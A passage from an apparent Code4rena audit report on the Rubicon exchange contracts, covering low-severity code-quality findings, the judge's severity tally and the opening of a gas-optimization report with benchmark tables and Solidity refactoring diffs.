            IERC20(_bathTokenAsset).balanceOf(address(this)) == 0 &&
            borrowBalance(_bathTokenAsset) == 0
        )
```

## [N-15] USE OF `BYTES.CONCAT()` INSTEAD OF ABI.ENCODEPACKED()
Since version 0.8.4 for appending bytes, [bytes.concat()](https://docs.soliditylang.org/en/v0.8.19/types.html#bytes-concat) can be used instead of `abi.encodePacked()`.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
369:  keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem))
400:  keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem))
423:  keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem))
442:  keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem))
476:  keccak256(abi.encodePacked(_offer.pay_gem, _offer.buy_gem))
555:  keccak256(abi.encodePacked(pay_gem, buy_gem))
```

## [N-16] ASSEMBLY CODES SPECIFIC - SHOULD HAVE COMMENTS
Since this is a low level language that is more difficult to parse by readers, include extensive documentation, comments on the rationale behind its use, clearly explaining what each assembly instruction does

This will make it easier for users to trust the code, for reviewers to validate the code, and for developers to build on or update the code.

Note that using Aseembly removes several important security features of Solidity, which can make the code more insecure and more error-prone.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
648:    assembly {
            foo := calldataload(4)
            bar := calldataload(36)
            wad := callvalue()
        }

contracts/utilities/poolsUtility/Position.sol
367:    assembly {
            switch _initBathTokenAmount
            case 0 {
                _bathTokenAmount := _currentBathTokenAmount
            }
            default {
                _bathTokenAmount := sub(
                    _currentBathTokenAmount,
                    _initBathTokenAmount
                )
            }
        }        
```

## [N-17] FUNCTION OVERLOADING
Having multiple functions with the same name in a smart contract can be dangerous or not a good practice for several reasons:

- Confusion: If there are several functions with the same name, it can be confusing for developers and users who are interacting with the smart contract. This can lead to errors and misunderstandings in the use of the contract.

- Security vulnerabilities: If multiple functions are defined with the same name, attackers can attempt to exploit this vulnerability to access or modify data or functionalities of the smart contract.

- Network overload: If there are multiple functions with the same name, there may be an impact on the efficiency and speed of the contract, as the network may be confused in trying to determine which function should be executed.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
// @audit Refactorize
 674: contract RubiconMarket is MatchingEvents, ExpiringMarket, DSNote {
    ...........................................
    function offer(
        uint256 pay_amt, //maker (ask) sell how much
        ERC20 pay_gem, //maker (ask) sell which token
        uint256 buy_amt, //maker (ask) buy how much
        ERC20 buy_gem //maker (ask) buy which token
    ) external can_offer returns (uint256) {
        return
            offer(
                pay_amt,
                pay_gem,
                buy_amt,
                buy_gem,
                0,
                true,
                msg.sender,
                msg.sender
            );
    }

    function offer(
        uint256 pay_amt, //maker (ask) sell how much
        ERC20 pay_gem, //maker (ask) sell which token
        uint256 buy_amt, //maker (ask) buy how much
        ERC20 buy_gem, //maker (ask) buy which token
        uint pos, //position to insert offer, 0 should be used if unknown
        bool rounding
    ) external can_offer returns (uint256) {
        return
            offer(
                pay_amt,
                pay_gem,
                buy_amt,
                buy_gem,
                pos,
                rounding,
                msg.sender,
                msg.sender
            );
    }

    // Make a new offer. Takes funds from the caller into market escrow.
    function offer(
        uint256 pay_amt, //maker (ask) sell how much
        ERC20 pay_gem, //maker (ask) sell which token
        uint256 buy_amt, //maker (ask) buy how much
        ERC20 buy_gem, //maker (ask) buy which token
        uint256 pos, //position to insert offer, 0 should be used if unknown
        address owner,
        address recipient
    ) external can_offer returns (uint256) {
        return
            offer(
                pay_amt,
                pay_gem,
                buy_amt,
                buy_gem,
                pos,
                true,
                owner,
                recipient
            );
    }

    function offer(
        uint256 pay_amt, //maker (ask) sell how much
        ERC20 pay_gem, //maker (ask) sell which token
        uint256 buy_amt, //maker (ask) buy how much
        ERC20 buy_gem, //maker (ask) buy which token
        uint256 pos, //position to insert offer, 0 should be used if unknown
        bool matching, //match "close enough" orders?
        address owner, // owner of the offer
        address recipient // recipient of the offer's fill
    ) public can_offer returns (uint256) {
        require(!locked, "Reentrancy attempt");
        require(_dust[address(pay_gem)] <= pay_amt);

        /// @dev currently matching is perma-enabled
        // if (matchingEnabled) {
        return
            _matcho(
                pay_amt,
                pay_gem,
                buy_amt,
                buy_gem,
                pos,
                matching,
                owner,
                recipient
            );
        // }
        // return super.offer(pay_amt, pay_gem, buy_amt, buy_gem);
    }
}
```
### RECOMMENDATION
To avoid problems related to function overloading in smart contracts, it is recommended to follow best programming practices. 

Some recommendations are:
- Name functions in a descriptive and unique way to avoid function overloading.
- Use input arguments with different data types to distinguish functions.
- Avoid unnecessary function overloading, i.e., define additional functions only if necessary and not just for convenience or ease of programming.
- Clearly document the functions and their uses to avoid confusion.

By following these recommendations, developers can avoid function overloading and create smarter and more secure contracts that are easier to use.

## [N-18] USING WHILE FOR UNBOUNDED LOOPS ISN'T RECOMMENDED
Improve the efficiency and stability of your code by avoiding unbounded `while loops`. Instead of using a `while loop` for unbounded iterations, it is recommended to use other loop structures like `for` that have a clearer structure and can provide better control flow for the loop. Don't write loops that are unbounded as this can hit the gas limit, causing your transaction to fail. For the reason above, `while` and `do-while` loops are rarely used.

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
// @audit Avoid unbounded loops
    1037: while (pay_amt > 0) 
    1077: while (buy_amt > 0)
    1130: while (pay_amt > offers[offerId].buy_amt)
    1163: while (buy_amt > offers[offerId].pay_amt)
    1217: while (top != 0 && _isPricedLtOrEq(id, top))
    1229: while (pos != 0 && !isActive(pos))
    1244: while (pos != 0 && _isPricedLtOrEq(id, pos))
    1252: while (pos != 0 && !_isPricedLtOrEq(id, pos))
    1289: while (_best[address(t_buy_gem)][address(t_pay_gem)] > 0)
    1452: while (uid > 0 && uid != id)

    contracts/utilities/poolsUtility/Position.sol
    541: while (_assetAmount <= _desiredAmount) 
```
### RECOMMENDATION
Avoid unbounded loops. As mentioned before, it is important to avoid unbounded while loops in your smart contracts. If you need to make a loop, make sure that the number of iterations is limited and known in advance.

## [N-19] TOKENS ACCIDENTALLY SENT TO THE CONTRACT CANNOT BE RECOVERED
It can't be recovered if the tokens accidentally arrive at the `V2Migrator` contract address. In line 65, it is noted that `BATH TOKENS V2` may get stuck, but no token recovery implementation is implemented if this happens. We recommend adding a recovery code to this contract.

### MITIGATION
Add this code:
```solidity
 /**
  * @notice Sends ERC20 tokens trapped in contract to external address
  * @dev Onlyowner is allowed to make this function call
  * @param account is the receiving address
  * @param externalToken is the token being sent
  * @param amount is the quantity being sent
  * @return boolean value indicating whether the operation succeeded.
  *
 */
function rescueERC20(address account, address externalToken, uint256 amount) public onlyOwner returns (bool) {
    IERC20(externalToken).transfer(account, amount);
    return true;
}
```

## [N-20] CONTRACT DOES NOT FOLLOW THE SOLIDITY STYLE GUIDE'S SUGGESTED LAYOUT ORDERING
The [style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout) says that, within a contract, the ordering should be: 
1. Type declarations 
2. State variables,
3. Events 
4. Modifiers 
5. Functions 

But the contract(s) below do not follow this ordering:

- [BathBuddy.sol](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol)

## [R-01] FUNCTION NAMING SUGGESTIONS
Proper use of `_` as a function name prefix and a common pattern is to prefix internal and private function names with `_`. This pattern is correctly applied in all contracts; however, there are some inconsistencies in just these contracts:

### PROOF OF CONCEPT
```solidity
contracts/RubiconMarket.sol
// @audit Refactorize
35: function isAuthorized(address src) internal view returns (bool) {

contracts/utilities/poolsUtility/Position.sol
125: function openPosition(
        address asset,
        address quote,
        uint256 initMargin,
        uint256 leverage
    ) internal returns (bool OK) {
```
### RECOMMENDATION
```diff
-35: function isAuthorized(address src) internal view returns (bool)
+35: function _isAuthorized(address src) internal view returns (bool) 
```

## [R-02] SOME NUMBER VALUES CAN BE REFACTORED WITH `_`
Consider using underscores for number values to improve readability.

```solidity
contracts/utilities/poolsUtility/Position.sol
481: uint256 _fee = _minFill.mul(_feeBPS).div(10000);
490:  _fee = _payAmount.mul(_feeBPS).div(10000);
```

## [S-01] WE SUGGEST USING THE OPENZEPPELIN SAFECAST LIBRARY
We have noticed that the contract `RubiconMarket.sol` implements many type conversions from `uint256` to `uint128`. We recommend using the OpenZeppelin SafeCast library to make the project more robust and take advantage of the gas optimizations and best practices provided by OpenZeppelin.

```solidity
openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol#L290
    /**
     * @dev Returns the downcasted uint128 from uint256, reverting on
     * overflow (when the input is greater than largest uint128).
     *
     * Counterpart to Solidity's `uint128` operator.
     *
     * Requirements:
     *
     * - input must fit into 128 bits
     *
     * _Available since v2.5._
     */
    function toUint128(uint256 value) internal pure returns (uint128) {
        require(value <= type(uint128).max, "SafeCast: value doesn't fit in 128 bits");
        return uint128(value);
    }
```

## [S-02] WE SUGGEST USING THE OPENZEPPELIN ADDRESS LIBRARY
In the `FeeWrapper.sol` contract, the low-level `call()` function is used for certain operations. However, it is recommended to use the `Address.sol` library from `OpenZeppelin` to implement these operations in a secure manner and take advantage of the gas optimizations and good practices offered by that library.

```solidity
openzeppelin-contracts/blob/master/contracts/utils/Address.sol
    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
```

## [S-03] WE SUGGEST USING THE BoringERC20 LIBRARY
We suggest implementing best practices for SYMBOL, DECIMALS & NAME on lines `L146-147` and `L148` in the `BathHouseV2` contract . Therefore, we recommend using the following functions from this library: 
[Library BoringERC20](https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L33-L55).

## [S-04] WE SUGGEST USING A MORE RECENT SOLIDITY PRAGMA TO TAKE ADVANTAGE
We recommend using a more recent version of Solidity, such as 0.8.18, to take advantage of the latest improvements and features, including better code readability in the case of mappings.

You have 19 mappings in the scope.

For example: 
```solidity
mapping(address account => uint256 balance)
```

**[HickupHH3 (judge) commented](https://github.com/code-423n4/2023-04-rubicon-findings/issues/254#issuecomment-1580297233):**
 > It would have been great if the report was filtered against the automated output.
> 
> L-01: Refactor<br>
> L-02: Refactor<br>
> L-03: Refactor<br>
> L-04: Non-Critical<br>
> L-05: Non-Critical<br>
> L-06: Low<br>
> L-07: Refactor<br>
> L-08: Refactor<br>
> L-09: Low<br>
> L-10: Refactor<br>
> L-11: Refactor<br>
> L-12: Refactor<br>
> 
> ---
> 
> N-01 / N-12: Non-Critical<br>
> N-02 / S-04: Non-Critical<br>
> N-03: Non-Critical<br>
> N-04: Non-Critical<br>
> N-05: Non-Critical<br>
> N-06: Non-Critical<br>
> N-07: Non-Critical<br>
> N-08: Non-Critical<br>
> N-09: Non-Critical<br>
> N-10 / N-11: Non-Critical<br>
> N-13: Non-Critical<br>
> N-14: Non-Critical<br>
> N-15: Non-Critical<br>
> N-16: Non-Critical<br>
> N-17: Refactor<br>
> N-18: Non-Critical<br>
> N-19: Non-Critical<br>
> N-20: Non-Critical<br>
> 
> ---
> R-01: Refactor<br>
> R-02: Non-Critical<br>
> S-01: Refactor<br>
> S-02: Refactor<br>
> S-03: Refactor<br>
> 
> For a total of 2 Lows, 13 Refactors + 23 Non-Criticals.

***

# Gas Optimizations

For this audit, 29 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1135) by **JCN** received the top score from the judge.

*The following wardens also submitted reports: [Udsen](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1351), 
[adriro](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1328), 
[c3phas](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1264), 
[MohammedRizwan](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1161), 
[hunter\_w3b](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1088), 
[ddimitrov22](https://github.com/code-423n4/2023-04-rubicon-findings/issues/1000), 
[pixpi](https://github.com/code-423n4/2023-04-rubicon-findings/issues/983), 
[SAAJ](https://github.com/code-423n4/2023-04-rubicon-findings/issues/955), 
[saneryee](https://github.com/code-423n4/2023-04-rubicon-findings/issues/923), 
[0xSmartContract](https://github.com/code-423n4/2023-04-rubicon-findings/issues/888), 
[\_\_141345\_\_](https://github.com/code-423n4/2023-04-rubicon-findings/issues/878), 
[atharvasama](https://github.com/code-423n4/2023-04-rubicon-findings/issues/877), 
[SleepingShell](https://github.com/code-423n4/2023-04-rubicon-findings/issues/795), 
[thekmj](https://github.com/code-423n4/2023-04-rubicon-findings/issues/751), 
[Madalad](https://github.com/code-423n4/2023-04-rubicon-findings/issues/747), 
[Rageur](https://github.com/code-423n4/2023-04-rubicon-findings/issues/723), 
[BGSecurity](https://github.com/code-423n4/2023-04-rubicon-findings/issues/719), 
[0xnev](https://github.com/code-423n4/2023-04-rubicon-findings/issues/635), 
[matrix\_0wl](https://github.com/code-423n4/2023-04-rubicon-findings/issues/501), 
[Raihan](https://github.com/code-423n4/2023-04-rubicon-findings/issues/459), 
[ReyAdmirado](https://github.com/code-423n4/2023-04-rubicon-findings/issues/449), 
[0x6980](https://github.com/code-423n4/2023-04-rubicon-findings/issues/435), 
[dharma09](https://github.com/code-423n4/2023-04-rubicon-findings/issues/424), 
[RaymondFam](https://github.com/code-423n4/2023-04-rubicon-findings/issues/362), 
[0x3b](https://github.com/code-423n4/2023-04-rubicon-findings/issues/121), 
[Sathish9098](https://github.com/code-423n4/2023-04-rubicon-findings/issues/62), 
[Rolezn](https://github.com/code-423n4/2023-04-rubicon-findings/issues/53) and
[0xhacksmithh](https://github.com/code-423n4/2023-04-rubicon-findings/issues/8).*

# Summary
A majority of the optimizations were benchmarked via the protocol's tests, i.e. using the following config: `solc version 0.8.17`, `optimizer on`, and `5 runs`. Optimizations that were not benchmarked are explained via EVM gas costs and opcodes.

Below are the overall average gas savings for the following tested functions, with all the optimizations applied (not including G-01 and G-02):
| Function |    Before   |    After   | Avg Gas Savings |
| ------ | -------- | -------- | ------- |
| BathBuddy.notifyRewardAmount |  113455  |  68064  |  45391 | 
| BathBuddy.setRewardsDuration |  49947  |  47792  |  2155 |  
| BathHouseV2.claimRewards |  265601  |  240252  | 25349 | 
| ExpiringMarket.cancel |  118396  |  86489 | 31907 | 
| Position.buyAllAmountWithLeverage |  694718  |  638441  | 56277 | 
| Position.closePosition |  500436  |  490680  | 9756 | 
| Position.increaseMargin |  201193  |  195290  | 5903 | 
| RubiconMarket.buy |  142006  |  139691  | 2315 | 
| RubiconMarket.offer |  259582  |  251681  | 7901 | 
| RubiconMarket.sellAllAmount |  145248  |  142506  | 2742 | 
| RubiconRouter.buyAllAmountForETH |  217184  |  201348  | 15836 | 
| RubiconRouter.buyAllAmountWithETH |  225975  |  220047  | 5928 | 
| RubiconRouter.cancelForETH |  169250  |  152143  | 17107 |
| RubiconRouter.offerForETH |  332029  |  331577  | 452 |
| RubiconRouter.offerWithETH |  350416  |  350246  | 170 |

**Total gas saved across all listed functions: 229189**

*Notes*: 

- The `Avg` gas changes unpredictably for `buyAllAmountWithLeverage` and therefore the `Min` gas for this function is used for benchmarking.
- The [Gas report](https://github.com/code-423n4/2023-04-rubicon-findings/blob/main/data/JCN-G.md#gasreport-output-with-all-optimizations-applied) output, after all optimizations have been applied, can be found at the end of the report.
- The final diffs for each contract, with all the optimizations applied, can be found [here](https://gist.github.com/0xJCN/69437a989c5a2a2ef4ae45a7ff13cac7).
- Some code snippets may be truncated to save space. Code snippets may also be accompanied by `@audit` tags in comments to aid in explaining the issue.

## Gas Optimizations
| Number |Issue|Instances|
|:-:|:-|:-:|
| [G&#8209;01] | Do not use `SafeMath` | - | 
| [G&#8209;02] | Use a more gas efficient `synchronized` modifier | - | 
| [G&#8209;03] | Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate | 2 | 
| [G&#8209;04] | State variables only set in the constructor should be declared immutable | 4 | 
| [G&#8209;05] | State variables can be cached instead of re-reading them from storage | 32 |
| [G&#8209;06] | Avoid emitting storage values | 1 |
| [G&#8209;07] | Structs can be packed to use fewer storage slots | 2 |
| [G&#8209;08] | State variables can be packed to use fewer storage slots | 1 |
| [G&#8209;09] | Rearrange storage variables to pack values more efficiently | 1 |
| [G&#8209;10] | Return values from external calls can be cached to avoid unecessary call | 1 |
| [G&#8209;11] | Multiple accesses of a mapping/array should use a storage pointer | 43 | 
| [G&#8209;12] | Use assembly for value transfer and success check | 1 | 

## [G-01] Do not use `SafeMath`
Since version 0.8.0, the compiler will throw an error for under/overflows. It does so by including extra opcodes to perform the necessary checks. Therefore, using `SafeMath` and the in-house `DSMath` contract is unnecessary and is wasting gas by doing extra computation (under/overflow checks). Save gas by not using `SafeMath` and the `DSMath` contract.

The following files have this issue: `RubiconMarket.sol`, which uses the [DSMath](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L44) contract, [BathBuddy.sol](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol), and [Position.sol](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol). 

## [G-02] Use a more gas efficient `synchronized` modifier
Each time a function that uses the `synchronized` modifier is called, said function will undergo a gas cost of `22.9k` for setting the `locked` slot to 1 from 0 (20k gas) and then back to 0 from 1 (2.9k gas). We are able to use a `1` and `2` instead of `false` and `true` to make a more efficient modifier. Using `1` and `2`, the functions will undergo a gas cost of `5.8k`: `1` -> `2` (2.9k gas) & `2` -> `1` (2.9k gas). See [this](https://hackmd.io/@fvictorio/gas-costs-after-berlin) article for more information.

Functions which have the `synchronized` modifier: [SimpleMarket.buy](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314), [SimpleMarket.cancel](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L452), and [SimpleMarket.offer](https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L511).

Estimated Gas Saved: `17100`.

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L264-L269

```solidity
264:    modifier synchronized() {
265:        require(!locked);
266:        locked = true;
267:        _;
268:        locked = false;
269:    }
```

## [G-03] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate
We can combine multiple mappings below into structs. We can then pack the structs by modifying the `uint` type for the values. This will result in cheaper storage reads since multiple mappings are accessed in functions and those values are now occupying the same storage slot, meaning the slot will become warm after the first SLOAD. In addition, when setting the struct values we will avoid incurring multiple `Gsset (20000 gas)` since multiple struct values are now occupying the same slot.

*The first 5 mappings relate to token information and can therefore be combined into a struct. The last two mappings contain token information that is specific to a user, therefore those mappings can be combined into another struct.*

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/periphery/BathBuddy.sol#L52-L61

*Gas Savings for `notifyRewardAmount`, obtained via protocol's tests: Avg 43096 gas*.
|        |    Min   |    Max   |   Avg   | # calls  |
| ------ | -------- | -------- | ------- | -------- |
| Before |  -  |  -  |  113455 |    1    |
| After  |  -  |  -  |  70359  |    1    |

*Gas Savings for `setRewardsDuration`, obtained via protocol's tests: Avg 2120 gas*.
|        |    Min   |    Max   |   Avg   | # calls  |
| ------ | -------- | -------- | ------- | -------- |
| Before |  -  |  -  |  49947 |    1    |
| After  |  -  |  -  |  47827 |    1    |

*Gas Savings for `claimRewards`, obtained via protocol's tests: Avg 23219 gas*.
|        |    Min   |    Max   |   Avg   | # calls  |
| ------ | -------- | -------- | ------- | -------- |
| Before |  -  |  -  |  265601 |    1    |
| After  |  -  |  -  |  242382 |    1    |

```solidity
File: contracts/periphery/BathBuddy.sol
52:    mapping(address => uint256) public periodFinish; // Token specific
53:    mapping(address => uint256) public rewardRates; // Token specific reward rates
54:    mapping(address => uint256) public rewardsDuration; // Can be kept global but can also be token specific
55:    mapping(address => uint256) public lastUpdateTime; //Token specific
56:    mapping(address => uint256) public rewardsPerTokensStored; // Token specific
57:
58:    // Token then user always
59:    mapping(address => mapping(address => uint256))
60:        public userRewardsPerTokenPaid; // ATTEMPTED TOKEN AGNOSTIC
61:    mapping(address => mapping(address => uint256)) public tokenRewards; // ATTEMPTED TOKEN AGNOSTIC
```
```diff
diff --git a/contracts/periphery/BathBuddy.sol b/contracts/periphery/BathBuddy.sol
index 4aac344..6d49bde 100644
--- a/contracts/periphery/BathBuddy.sol
+++ b/contracts/periphery/BathBuddy.sol
@@ -48,17 +48,24 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
     address public bathHouse;
     bool public friendshipStarted;

+    struct TokenInfo {
+        uint80 periodFinish;
+        uint80 lastUpdateTime;
+        uint80 rewardsDuration;
+        uint128 rewardRates;
+        uint128 rewardsPerTokensStored;
+    }
+
+    struct UserInfo {
+        uint128 userRewardsPerTokenPaid;
+        uint128 tokenRewards;
+    }
+
     /// @dev set to block.timestamp + rewards duration to track an active rewards period after notifyRewardAmount()
-    mapping(address => uint256) public periodFinish; // Token specific
-    mapping(address => uint256) public rewardRates; // Token specific reward rates
-    mapping(address => uint256) public rewardsDuration; // Can be kept global but can also be token specific
-    mapping(address => uint256) public lastUpdateTime; //Token specific
-    mapping(address => uint256) public rewardsPerTokensStored; // Token specific
+    mapping(address => TokenInfo) public tokenInfo;

     // Token then user always
-    mapping(address => mapping(address => uint256))
-        public userRewardsPerTokenPaid; // ATTEMPTED TOKEN AGNOSTIC
-    mapping(address => mapping(address => uint256)) public tokenRewards; // ATTEMPTED TOKEN AGNOSTIC
+    mapping(address => mapping(address => UserInfo)) public userInfo;

     /* ========== CONSTRUCTOR ========== */

@@ -112,23 +119,25 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
     function lastTimeRewardApplicable(
         address token
     ) public view returns (uint256) {
+        TokenInfo storage _tokenInfo = tokenInfo[token];
         return
-            block.timestamp < periodFinish[token]
+            block.timestamp < _tokenInfo.periodFinish
                 ? block.timestamp
-                : periodFinish[token];
+                : _tokenInfo.periodFinish;
     }

     function rewardPerToken(address token) public view returns (uint256) {
         require(friendshipStarted, "I have not started a bathToken friendship");
-
+
+        TokenInfo storage _tokenInfo = tokenInfo[token];
         if (IERC20(myBathTokenBuddy).totalSupply() == 0) {
-            return rewardsPerTokensStored[token];
+            return _tokenInfo.rewardsPerTokensStored;
         }
         return
-            rewardsPerTokensStored[token].add(
+            uint256(_tokenInfo.rewardsPerTokensStored).add(
                 lastTimeRewardApplicable(token)
-                    .sub(lastUpdateTime[token])
-                    .mul(rewardRates[token])
+                    .sub(_tokenInfo.lastUpdateTime)
+                    .mul(_tokenInfo.rewardRates)
                     .mul(1e18)
                     .div(IERC20(myBathTokenBuddy).totalSupply())
             );
@@ -141,23 +150,25 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
         address token
     ) public view override returns (uint256) {
         require(friendshipStarted, "I have not started a bathToken friendship");
-
+
+        UserInfo storage _userInfo = userInfo[token][account];
         return
             IERC20(myBathTokenBuddy) // Care with this?
                 .balanceOf(account)
                 .mul(
                     rewardPerToken(token).sub(
-                        userRewardsPerTokenPaid[token][account]
+                        _userInfo.userRewardsPerTokenPaid
                     )
                 )
                 .div(1e18)
-                .add(tokenRewards[token][account]);
+                .add(_userInfo.tokenRewards);
     }

     function getRewardForDuration(
         address token
     ) external view returns (uint256) {
-        return rewardRates[token].mul(rewardsDuration[token]);
+        TokenInfo storage _tokenInfo = tokenInfo[token];
+        return uint256(_tokenInfo.rewardRates).mul(_tokenInfo.rewardsDuration);
     }

     /* ========== MUTATIVE FUNCTIONS ========== */
@@ -176,9 +187,10 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
         updateReward(holderRecipient, address(rewardsToken))
         onlyBathHouse
     {
-        uint256 reward = tokenRewards[address(rewardsToken)][holderRecipient];
+        UserInfo storage _userInfo = userInfo[address(rewardsToken)][holderRecipient];
+        uint256 reward = _userInfo.tokenRewards;
         if (reward > 0) {
-            tokenRewards[address(rewardsToken)][holderRecipient] = 0;
+            _userInfo.tokenRewards = 0;
             rewardsToken.safeTransfer(holderRecipient, reward);
             emit RewardPaid(holderRecipient, reward);
         }
@@ -192,20 +204,21 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
         uint256 reward,
         IERC20 rewardsToken
     ) external onlyOwner updateReward(address(0), address(rewardsToken)) {
-        if (block.timestamp >= periodFinish[address(rewardsToken)]) {
-            rewardRates[address(rewardsToken)] = reward.div(
-                rewardsDuration[address(rewardsToken)]
-            );
+        TokenInfo storage _tokenInfo = tokenInfo[address(rewardsToken)];
+        if (block.timestamp >= _tokenInfo.periodFinish) {
+            _tokenInfo.rewardRates = uint128(reward.div(
+                _tokenInfo.rewardsDuration
+            ));
         } else {
-            uint256 remaining = periodFinish[address(rewardsToken)].sub(
+            uint256 remaining = uint256(_tokenInfo.periodFinish).sub(
                 block.timestamp
             );
             uint256 leftover = remaining.mul(
-                rewardRates[address(rewardsToken)]
-            );
-            rewardRates[address(rewardsToken)] = reward.add(leftover).div(
-                rewardsDuration[address(rewardsToken)]
+                _tokenInfo.rewardRates
             );
+            _tokenInfo.rewardRates = uint128(reward.add(leftover).div(
+                _tokenInfo.rewardsDuration
+            ));
         }

         // Ensure the provided reward amount is not more than the balance in the contract.
@@ -215,15 +228,15 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
         // Note********** ERC20s must be here*************
         uint256 balance = rewardsToken.balanceOf(address(this));
         require(
-            rewardRates[address(rewardsToken)] <=
-                balance.div(rewardsDuration[address(rewardsToken)]),
+            _tokenInfo.rewardRates <=
+                balance.div(_tokenInfo.rewardsDuration),
             "Provided reward too high"
         );

-        lastUpdateTime[address(rewardsToken)] = block.timestamp;
-        periodFinish[address(rewardsToken)] = block.timestamp.add(
-            rewardsDuration[address(rewardsToken)]
-        );
+        _tokenInfo.lastUpdateTime = uint80(block.timestamp);
+        _tokenInfo.periodFinish = uint80(block.timestamp.add(
+            _tokenInfo.rewardsDuration
+        ));
         emit RewardAdded(reward);
     }

@@ -233,25 +246,26 @@ contract BathBuddy is ReentrancyGuard, IBathBuddy, Pausable {
         uint256 _rewardsDuration,
         address token
     ) external onlyOwner {
+        TokenInfo storage _tokenInfo = tokenInfo[token];
         require(
-            block.timestamp > periodFinish[token],
+            block.timestamp > _tokenInfo.periodFinish,
             "Previous rewards period must be complete before changing the duration for the new period"
         );
-        rewardsDuration[token] = _rewardsDuration;
-        emit RewardsDurationUpdated(rewardsDuration[token]);
+        _tokenInfo.rewardsDuration = uint80(_rewardsDuration);
+        emit RewardsDurationUpdated(_tokenInfo.rewardsDuration);
     }

     /* ========== MODIFIERS ========== */

     // Rewards set here
     modifier updateReward(address account, address token) {
-        rewardsPerTokensStored[token] = rewardPerToken(token);
-        lastUpdateTime[token] = lastTimeRewardApplicable(token);
+        TokenInfo storage _tokenInfo = tokenInfo[token];
+        _tokenInfo.rewardsPerTokensStored = uint128(rewardPerToken(token));
+        _tokenInfo.lastUpdateTime = uint80(lastTimeRewardApplicable(token));
         if (account != address(0)) {
-            tokenRewards[token][account] = earned(account, token);
-            userRewardsPerTokenPaid[token][account] = rewardsPerTokensStored[
-                token
-            ];
+            UserInfo storage _userInfo = userInfo[token][account];
+            _userInfo.tokenRewards = uint128(earned(account, token));
+            _userInfo.userRewardsPerTokenPaid = _tokenInfo.rewardsPerTokensStored;
         }
         _;
     }
```

## [G-04] State variables only set in the constructor should be declared immutable
The solidity compiler will directly embed the values of immutable variables into your contract bytecode and therefore will save you from incurring a `Gsset (20000 gas)` when you set storage variables in the constructor, a `Gcoldsload (2100 gas)` when you access storage variables for the first time in a transaction, and a `Gwarmaccess (100 gas)` for each subsequent access to that storage slot.

Total Instances: `4`

Estimated Gas Saved: `4 * 2100 = 8400`

https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L44-L47
```solidity
File: contracts/utilities/poolsUtility/Position.sol
44:    Comptroller public comptroller;
45:    PriceOracle public oracle;
46:    RubiconMarket public rubiconMarket;
47:    BathHouseV2 public bathHouseV2;
```
```diff
diff --git a/contracts/utilities/poolsUtility/Position.sol b/contracts/utilities/poolsUtility/Position.sol
index 7c72d4f..a79c2fe 100644
--- a/contracts/utilities/poolsUtility/Position.sol
+++ b/contracts/utilities/poolsUtility/Position.sol
@@ -41,10 +41,10 @@ contract Position is Ownable, DSMath {
     // position id => Position struct
     mapping(uint256 => Position) public positions;

-    Comptroller public comptroller;
-    PriceOracle public oracle;
-    RubiconMarket public rubiconMarket;
-    BathHouseV2 public bathHouseV2;
+    Comptroller immutable public comptroller;
+    PriceOracle immutable public oracle;
+    RubiconMarket immutable public rubiconMarket;
+    BathHouseV2 immutable public bathHouseV2;

     // events
     event PositionOpened(uint256 positionId, Position position);
```

## [G-05] State variables can be cached instead of re-reading them from storage
Caching of a state variable replaces each `Gwarmaccess (100 gas)` with a much cheaper stack read.

